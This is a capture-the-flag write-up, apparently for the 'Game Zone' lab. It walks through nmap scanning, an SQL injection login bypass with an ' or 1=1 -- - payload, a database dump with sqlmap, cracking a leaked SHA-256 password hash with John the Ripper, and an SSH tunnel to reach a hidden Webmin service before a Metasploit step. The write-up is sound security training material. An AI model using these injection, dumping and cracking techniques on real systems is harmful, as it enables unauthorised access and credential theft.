>Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

My IP = **10.10.246.70**
VICTIM IP = 10.10.60.159

>This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges.

# Scans

`nmap -A 10.10.60.159`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61ea89f1d4a7dca550f76d89c3af0b03 (RSA)
|   256 b37d72461ed341b66a911516c94aa5fa (ECDSA)
|_  256 536709dcfffb3a3efbfecfd86d4127ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone

```

==SSH -> 22
http -> 80==

`nmap -sV --script vuln 10.10.60.159`

```

```


# The web page

Connect to http://http://10.10.60.159/

![[Pasted image 20231005084816.png]]

We se **Agent 47** in the main page.

There is a login form. A query can look like so:

**SELECT * FROM users WHERE username = username_field AND password = password_field**

If the query finds data, you'll be allowed to login otherwise it will display an error message.

If we have our ==username as admin== and our ==password as: **' or 1=1 -- -**== it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:

**SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -**

>NOTA:
>`AND password := ' or 1=1 -- -'`: Questa parte è il cuore dell'attacco di SQL injection. L'attaccante sta cercando di manipolare la condizione di verifica della password. `' or 1=1 -- -` è una parte della query che modifica la condizione della password in modo che sia sempre vera (`1=1` è sempre vero). Il doppio trattino `--` è un commento SQL che serve a terminare la query originale, in modo che il database ignori tutto ciò che viene dopo di esso.

Quindi, l'intera query diventa:

`SELECT * FROM users WHERE username = 'admin' AND password := ' or 1=1 -- -'

But this combination not works because in the database there is no user call admin.
So we can try to force the username field with `' or 1=1 -- -`.

So, we use `' or 1=1 -- -` as your username and leave the password blank: since 1=1 is always true, the query will allow login to the web application. Commenting the rest of the query just in case.

![[Pasted image 20231005090443.png]]

Now we have a search bar to query a database => we use SQLMap to to dump the entire database for GameZone.

To do it:

1. Intercept a search with burp suite and save the request in a `.txt` file
![[Pasted image 20231005091723.png]]

2. Pass this into SQLMap to use our authenticated user session
	`sqlmap -r request.txt --dbms=mysql --dump`
	- **-r** uses the intercepted request you saved earlier  
	- **--dbms** tells SQLMap what type of database management system it is  
	- **--dump** attempts to outputs the entire database


> SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.

![[Pasted image 20231005092638.png]]

We foud the password hash : `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14` for the user `agent47`.
# Crack the hash password

Using hash-identifier tool we identify the hash type.
Then, adding the hash in a text file we pass it to john the ripper:

```
john --format=raw-sha256 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

We found that the password is: `videogamer124`

Let's connect via SSH.

![[Pasted image 20231005093018.png]]


# Exposing services with reverse SSH tunnels

![[Pasted image 20231006081514.png]]

*Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.*

- **-L** is a local tunnel (YOU <-- CLIENT). 
	==If a site was blocked, you can forward the traffic to a server you own and view it==. For example, if imgur was blocked at work, you can do **ssh -L 9000:imgur.com:80 user@example.com.** Going to localhost:9000 on your machine, will load imgur traffic using your other server.

- **-R** is a remote tunnel (YOU --> CLIENT). 
	==You forward your traffic to the other server for others to view==. Similar to the example above, but in ==reverse==.


We will use a tool called **`ss`** to ==investigate sockets running on a host==.

If we run **`ss -tulpn`** it will tell us what socket connections are running

|   |   |
|---|---|
|**Argument**|**Description**|
|-t|Display TCP sockets|
|-u|Display UDP sockets|
|-l|Displays only listening sockets|
|-p|Shows the process using the socket|
|-n|Doesn't resolve service names|

![[Pasted image 20231006081922.png]]

NOTE:
- there are 5 tcp connecction (5 tcp sockets running)
- port 22 --> ssh
- port 80 --> http
- port 10000 --> ?

Let's indagate more on the service running on port 10000.

![[Pasted image 20231006083603.png]]


It is no reachable. Let's try to use SSH tunnels. From our machine:

`ssh -L 10000:localhost:10000 agent47@10.10.174.168`

The syntax is:
- `ssh`: This is the command to initiate an SSH session.
- `-L 10000:localhost:10000`: This option specifies local port forwarding. It tells SSH to listen on port `10000` of your local machine and forward any traffic it receives there to `localhost` (the same machine where the SSH server is running) on port `10000` of the remote machine (`10.10.174.168` in this case).
    In simpler terms, any traffic sent to your local machine's port `10000` will be forwarded securely to port `10000` on the remote machine (`10.10.174.168`). This is useful for accessing services running on the remote server that are not directly accessible from your local machine.
- `agent47`: This is the username you're using to log in to the remote server.
- `@10.10.174.168`: This specifies the IP address of the remote server you want to connect to.

![[Pasted image 20231006083644.png]]

Let's try to login with the combination `agent47`:`videogamer124`.

![[Pasted image 20231006084001.png]]

We found the `Webmin version: 1.580`

![[Pasted image 20231006090153.png]]

NOTE:
- lhost = ifconfig IP
- RHOSTS = localhost

![[Pasted image 20231006090334.png]]




